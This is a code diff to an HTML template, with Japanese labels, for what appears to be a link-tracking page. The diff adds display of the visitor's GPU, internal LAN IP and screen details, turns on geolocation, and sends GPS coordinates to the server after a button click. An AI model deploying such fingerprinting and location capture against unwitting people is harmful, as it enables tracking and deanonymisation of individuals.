@@ -11,6 +11,7 @@ table{width:100%;border-collapse:collapse;font-size:13px;margin:14px 0}
 th{text-align:left;color:#7b8494;font-weight:400;padding:6px 8px 6px 0;white-space:nowrap;vertical-align:top}
 td{padding:6px 0;word-break:break-all}
 .mono{font-family:ui-monospace,Menlo,monospace}
+.note{font-size:11px;color:#f0b429;margin:0 0 8px}
 button{margin-top:14px;padding:12px 32px;border:0;border-radius:999px;background:#4c8dff;color:#fff;font-size:15px}
 </style></head><body>
 <div class="wrap">
@@ -19,11 +20,15 @@ button{margin-top:14px;padding:12px 32px;border:0;border-radius:999px;background
   <div id="card" hidden>
     <table>
       <tr><th>IP</th><td class="mono">{{ ip }}</td></tr>
+      {% if notes %}<tr><th>IP種別</th><td>{{ notes|join(" / ") }}</td></tr>{% endif %}
       <tr><th>推定地域</th><td>{{ g.country }} / {{ g.region }} / {{ g.city }}</td></tr>
       <tr><th>回線</th><td>{{ g.isp }} {{ g.asn }}</td></tr>
       <tr><th>端末</th><td>{{ p.device }} / {{ p.os }} / {{ p.browser }}</td></tr>
       <tr><th>端末ID</th><td class="mono" id="vid">—</td></tr>
-      <tr><th>フィンガープリント</th><td class="mono" id="fp">—</td></tr>
+      <tr><th>指紋</th><td class="mono" id="fp">—</td></tr>
+      <tr><th>GPU</th><td class="mono" id="gpu">—</td></tr>
+      <tr><th>LAN内IP</th><td class="mono" id="lan">—</td></tr>
+      <tr><th>画面</th><td class="mono" id="scr">—</td></tr>
     </table>
     <button id="go">続ける</button>
   </div>
@@ -32,12 +37,15 @@ button{margin-top:14px;padding:12px 32px;border:0;border-radius:999px;background
 window.LT_CODE = {{ code|tojson }};
 window.LT_HIT  = {{ hit_id }};
 window.LT_NONCE = {{ nonce|tojson }};
-window.LT_GEO  = 0;
+window.LT_GEO  = 1;
 window.LT_READY = function (p) {
   document.getElementById("st").textContent = "確認できました";
   document.getElementById("card").hidden = false;
   document.getElementById("vid").textContent = p.vid || "—";
   document.getElementById("fp").textContent = (p.fp || "").slice(0, 32) || "—";
+  document.getElementById("gpu").textContent = p.gpu || "—";
+  document.getElementById("lan").textContent = p.lan_ip || "—";
+  document.getElementById("scr").textContent = p.screen || "—";
 };
 </script>
 <script src="/static/collect.js"></script>
@@ -51,7 +59,7 @@ go.onclick = function () {
   busy = true; go.disabled = true;
   navigator.geolocation.getCurrentPosition(
     async function (p) {
-      busy = false; done = true;            // 取れたら固定（未取得に戻さない）
+      busy = false; done = true;
       go.style.display = "none";
       try { await LT.send({ gps_lat: p.coords.latitude, gps_lon: p.coords.longitude,
                             gps_acc: p.coords.accuracy }); } catch (e) {}
